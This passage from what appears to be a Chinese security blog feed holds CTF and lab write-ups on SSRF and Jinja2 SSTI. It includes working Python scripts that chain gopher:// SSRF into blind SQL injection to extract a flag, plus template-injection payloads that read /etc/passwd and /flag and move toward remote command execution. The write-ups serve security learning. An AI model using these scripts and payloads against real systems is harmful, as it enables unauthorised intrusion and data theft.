class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>database = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#判断数据库名第i个字符的ascii码是否为j，是的话为真会返回&quot;meow&quot;</span><br>        content = content.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>)<span class="hljs-comment">#SQL页面存在空格过滤用/**/绕过</span><br>        content_length = <span class="hljs-built_in">len</span>(content)<br>        data = \<br><span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;content_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;content&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>        result = urllib.parse.quote(data)<br>        result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>        payload = <span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+result<br>        r = requests.post(url,data=&#123;<span class="hljs-string">&quot;url&quot;</span>:payload&#125;).text<br>        <span class="hljs-comment">#print(r)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow&quot;</span> <span class="hljs-keyword">in</span> r:<br>            database += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(database)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#r</span><br><span class="hljs-comment">#ru</span><br><span class="hljs-comment">#rua</span><br><span class="hljs-comment">#数据库名为rua</span><br></code></pre></td></tr></table></figure><p>同样，爆表名，因为可能存在多个表，所以使用<code>group_concat()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<br>        ...........<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#f</span><br><span class="hljs-comment">#fl</span><br><span class="hljs-comment">#fla</span><br><span class="hljs-comment">#flag</span><br><span class="hljs-comment">#flag,</span><br><span class="hljs-comment">#flag,m</span><br><span class="hljs-comment">#flag,me</span><br><span class="hljs-comment">#flag,mes</span><br><span class="hljs-comment">#flag,mess</span><br><span class="hljs-comment">#flag,messa</span><br><span class="hljs-comment">#flag,messag</span><br><span class="hljs-comment">#flag,message</span><br><span class="hljs-comment">#flag,messages</span><br></code></pre></td></tr></table></figure><p>盲猜flag在flag表里，爆字段名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27;),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#爆字段名</span><br>        ...........<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#f</span><br><span class="hljs-comment">#fl</span><br><span class="hljs-comment">#fla</span><br><span class="hljs-comment">#flag</span><br></code></pre></td></tr></table></figure><p>已知信息：</p><p>数据库rua、表flag、字段flag，爆flag内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(flag) from flag),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#爆flag表内容</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SSRF/image-20230412103314980.png"></p><p>拿到flag，本题还可以用二分法优化算法，附上L1ao学长的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuck</span>():<br>    url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>    result=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1290</span>):<br>        head=<span class="hljs-number">32</span><br>        tail=<span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> head&lt;tail:<br>            mid=(head+tail)&gt;&gt;<span class="hljs-number">1</span><br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;rua&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seLect(flag)from(rua.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            <span class="hljs-built_in">id</span> = urllib.parse.quote(sqli)<br>            id_length = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">id</span>)+<span class="hljs-number">3</span><br>            payload = <span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;id_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>            <span class="hljs-comment"># print(payload)</span><br>            tmp = urllib.parse.quote(payload)<br>            new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>            res = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/_&#x27;</span> + new<br>            dataa = &#123;<br>                <span class="hljs-string">&quot;url&quot;</span>:res<br>            &#125;<br>            r = requests.post(url=url,data=dataa)<br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow meow meow&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                head=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                tail=mid<br>        <span class="hljs-keyword">if</span> head !=<span class="hljs-number">32</span>:<br>            result+=<span class="hljs-built_in">chr</span>(head)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span>   <br>        <span class="hljs-built_in">print</span>(result)<br>fuck()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI</title>
    <link href="/2023/02/09/ssti/"/>
    <url>/2023/02/09/ssti/</url>
    
    <content type="html"><![CDATA[<h2 id="sources"><a href="#sources" class="headerlink" title="sources:"></a>sources:</h2><p><a href="https://docs.jinkan.org/docs/jinja2/templates.html#builtin-filters">https://docs.jinkan.org/docs/jinja2/templates.html#builtin-filters</a></p><p><a href="https://jinja.palletsprojects.com/en/3.1.x/templates/">https://jinja.palletsprojects.com/en/3.1.x/templates/</a></p><p><a href="https://dormousehole.readthedocs.io/en/latest/">https://dormousehole.readthedocs.io/en/latest/</a></p><p><a href="https://xz.aliyun.com/t/9584">https://xz.aliyun.com/t/9584</a></p><h2 id="2023FCTF热身赛filechecker-mini"><a href="#2023FCTF热身赛filechecker-mini" class="headerlink" title="2023FCTF热身赛filechecker_mini"></a>2023FCTF热身赛filechecker_mini</h2><p>打开题目，让我们上传一个文件：</p><p><img src="/2023/02/09/ssti/image-20230429032204160.png"></p><p>桌面上随便丢了个php文件进去提交看看会有啥情况：</p><p><img src="/2023/02/09/ssti/image-20230429032353870.png"></p><p>判断文件类型，(MIME绕过预定)</p><p>附件下载下来先看源码：</p><p>index.html：</p><p><img src="/2023/02/09/ssti/image-20230429030651913.png"></p><p>可以看出该网页使用模块渲染将result值渲染进index对应位置，那么就看下后端代码app.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string<br><span class="hljs-keyword">from</span> waitress <span class="hljs-keyword">import</span> serve<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><br>app_dir = os.path.split(os.path.realpath(__file__))[<span class="hljs-number">0</span>]<br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;app_dir&#125;</span>/upload/&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,result=<span class="hljs-string">&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;</span>)<br><br>        <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>            f = request.files[<span class="hljs-string">&#x27;file-upload&#x27;</span>]<br>            filepath = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)<br><br>            <span class="hljs-keyword">if</span> os.path.exists(filepath) <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-keyword">in</span> filepath:<br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, result=<span class="hljs-string">&quot;Don&#x27;t (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                f.save(filepath)<br>                file_check_res = subprocess.check_output(<br>                    [<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <br>                    shell=<span class="hljs-literal">False</span>, <br>                    encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>                    timeout=<span class="hljs-number">1</span><br>                )<br>                os.remove(filepath)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;empty&quot;</span> <span class="hljs-keyword">in</span> file_check_res <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;cannot open&quot;</span> <span class="hljs-keyword">in</span> file_check_res:<br>                    file_check_res=<span class="hljs-string">&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot;</span><br>                <span class="hljs-keyword">return</span> render_template_string(file_check_res)<br><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, result=<span class="hljs-string">&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    serve(app, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">3000</span>, threads=<span class="hljs-number">1000</span>, cleanup_interval=<span class="hljs-number">30</span>)<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230429032742576.png"></p><p>上面大家都用<code>render_template()</code>就你爱用<code>render_template_string()</code>是吧（指指点点，一眼模板注入，那么我们就希望<code>file_check_res</code>里有我们能够执行的rce代码。<code>file_check_res</code>哪来的？倒退往上看。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">f.save(filepath)<br>file_check_res = subprocess.check_output(<br>[<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <br>shell=<span class="hljs-literal">False</span>, <br>encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>imeout=<span class="hljs-number">1</span><br>)<br>os.remove(filepath)<br></code></pre></td></tr></table></figure><p>先保存filepath这样一个文件，<code>subprocess.check_output(command)</code>返回Linux命令行输出，然后再把filepath文件删除，那么这里的<code>file_check_res</code>就是<code>file -b &#123;filepath&#125;</code>的结果。往上看filepath其实就是将上传文件目录的绝对路径和该文件的文件名拼接起来来标定用户上传的这个文件在容器中的绝对位置。逻辑搞明白了，现在的重点就在于如何对一个文件使用<code>file -b</code> 命令后返回值中能回显我们所期望的值。动手操作下flie命令，发现其不会输出文件的内容只会输出其类型，</p><p><img src="/2023/02/09/ssti/image-20230429034451879.png"></p><p>代码中的-b参数作用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">-b 　#列出辨识结果时，不显示文件名称。<br></code></pre></td></tr></table></figure><p>所以在文件名上动手脚的想法也破灭了（悲。</p><p>卡住了，向大佬博客寻求帮助，去guthub查找file命令源码。第一个仓库点开。<img src="/2023/02/09/ssti/image-20230429191534591.png"></p><p>点开tests里面是各种针对该<code>file</code>命令的<a href="https://github.com/file/file/tree/master/tests">测试结果</a></p><p><img src="/2023/02/09/ssti/image-20230429191635511.png"></p><p>这8个分别分别是在文本中写入bash脚本的4种情况和对应的用<code>file</code>命令执行的输出结果，可以看出如果文本内容为<code>#!/usr/bin</code>开头的那么输出结果中会显示文本中的其他内容。</p><p><img src="/2023/02/09/ssti/image-20230429191927593.png"></p><p>本地做测试：创建一个文本文件修改内容如下</p><p><img src="/2023/02/09/ssti/image-20230429193849800.png"></p><p>测试结果如下：</p><p><img src="/2023/02/09/ssti/image-20230429193915755.png"></p><p>显而易见，输出可控，可以进行模板渲染。新建一个文本文件内容如下，上传文件</p><p><img src="/2023/02/09/ssti/image-20230429194117415.png"></p><p><img src="/2023/02/09/ssti/image-20230429194209528.png"></p><p>存在ssti漏洞，开始利用，调用os模块</p><p><img src="/2023/02/09/ssti/image-20230429195640928.png"></p><p><img src="/2023/02/09/ssti/image-20230429195803084.png"></p><p>调用popen()方法。</p><p><img src="/2023/02/09/ssti/image-20230429195958840.png"></p><p>上传文件，获取flag。</p><hr><h2 id="ssti-labs"><a href="#ssti-labs" class="headerlink" title="ssti_labs"></a>ssti_labs</h2><p>搭建踩的坑：</p><p>pip python 还有各种库版本之间的冲突，我pip和python全用的3，python版本是3.8。出现ImportError错误导致无法导入’soft_unicode’模块是由于markupsafe库的版本引起的，在py3.8中markupsafe库中的soft_unicode模块被移除，先升级injja2和markupsafe库到最新版本确保它们和python3.8兼容，<code>pip install --upgrade jijna2markupsafe</code>。还有itsdangerous库中的json模块也被移除，同上，<code>pip install --upgrade itsdangerous</code>，然后还是不行，是由于flask和itsdangerous版本之间的兼容性问题，将flask和itsdangerous降级到与py3.8兼容的较旧版本<code>pip install flask==1.1.4 itsdangerous==1.1.0</code>，成功部署完之后，又遇到问题，运行<code>python3 app.py</code>后，显示<code>* Running on http://127.0.0.1:5001/ (Press CTRL+C to quit)</code>但是却无法通过公网ip访问到。gpt debug，默认情况下flask只会绑定到回环地址，没法绑定到公网ip，所以无法外部访问，最后一行改成<code>app.run(host=&#39;0.0.0.0&#39;,port=5001,debug=&#39;True&#39;)</code>，然后就是，千万别用root跑(悲)，不然会被日的很惨(感谢L1ao学长的指出)，当然就算创建新用户跑，也面临着提权被干的风险，所以，最好还是用容器吧，还学了点别的小知识</p><p><code>kill -9 PID</code>：强制kill进程</p><p><code>adduser your_username</code>：在服务器上创建一个普通用户</p><p><code>chown your_username:your_username app.py</code>：将app.py的所有权转移到普通用户</p><p><code>su - your_username</code>：用普通用户身份登录</p><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>漏洞存在</p><p><img src="/2023/02/09/ssti/image-20230730212602385.png"></p><p><code>__class__</code>一个对象的类的引用，用于实例化对象，这里是字符串对象，<code>obj.__class__</code>返回该对象所属类，对于类本身，<code>Class.__class__</code>返回它的元类<img src="/2023/02/09/ssti/image-20230730212648721.png"></p><p>当前类的基类，这里有三种获取方法，<code>__base__</code>(获取直接父类)，<code>__bases__</code>(<code>Class.__bases__</code>返回Class的元组，包含它的直接父类)，<code>__mro__</code>，<code>__mro__</code>方法返回一个类的方法解析顺序，其中的类是在方法解析的过程中在寻找父类时需要考虑的类。要注意获取到的对象是多个还是单个，下面使用<code>__subclasses__()</code>时要注意的</p><p><img src="/2023/02/09/ssti/image-20230730212858437.png"></p><p><img src="/2023/02/09/ssti/image-20230730213654861.png"></p><p><img src="/2023/02/09/ssti/image-20230730213714396.png"></p><p>有这些类继承的方法，我们就可以从任何一个变量(字符串、数组，整型，配置(config)，甚至文件本身(self)等等)，回溯到最顶层基类（<code>&lt;class&#39;object&#39;&gt;</code>）中去，再获得到此基类所有实现的类，就可以获得到很多的类和方法了。</p><p><code>__subclasses__()</code>方法，直接返回一个类的所有子类列表，我们已经在最顶层基类了，看<code>&lt;class&#39;object&#39;&gt;</code>下有哪些子类，很多，SSTI 的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件或执行命令的类）加以利用。</p><p><img src="/2023/02/09/ssti/image-20230730215716944.png"></p><p>可通过角标查看<img src="/2023/02/09/ssti/image-20230730215805610.png"></p><p>，在python2中，子类file类可直接用于读取文件：</p><p>编写脚本寻找file类对应角标：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> html<span class="hljs-comment">#这里引入了html库是针对本题，运行返回网页内容是html实体，所以人为解码</span><br><br>url = <span class="hljs-string">&#x27;http://124.70.99.199:5001/level/1&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">300</span>):<br>    payload = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[%s]&#125;&#125;&quot;&quot;&quot;</span>%i<br><br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:payload&#125;).text<br>    r = html.unescape(r)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;file&quot;</span> <span class="hljs-keyword">in</span> r:<br><br>        <span class="hljs-built_in">print</span>(i)<br>        <br><span class="hljs-comment">#这里假设寻找到file类位于50位</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="hljs-number">50</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>但是现在基本上都用py3，包括我的靶场，所以有另外一种读文件方式，我们可以用<code>&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;</code> 这个类去读取文件。微调脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> html<span class="hljs-comment">#这里引入了html库是针对本题，运行返回网页内容是html实体，所以人为解码</span><br><br>url = <span class="hljs-string">&#x27;http://124.70.99.199:5001/level/1&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">300</span>):<br>    payload = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[%s]&#125;&#125;&quot;&quot;&quot;</span>%i<br><br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:payload&#125;).text<br>    r = html.unescape(r)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;FileLoader&quot;</span> <span class="hljs-keyword">in</span> r:<br><br>        <span class="hljs-built_in">print</span>(i)<br>        <br><span class="hljs-comment">#这里寻找到file类位于79下标</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230730225207888.png"></p><p><code>get_data</code>方法读文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">79</span>][<span class="hljs-string">&quot;get_data&quot;</span>](<span class="hljs-number">0</span>,<span class="hljs-string">&quot;/flag&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230730233526240.png"></p><p>玩点更有意思的，getshell</p><p>内建函数：</p><p>在python解释器启动时，即使没有创建任何变量或函数，无需导入任何模块，有很多函数可以使用，叫做内建函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 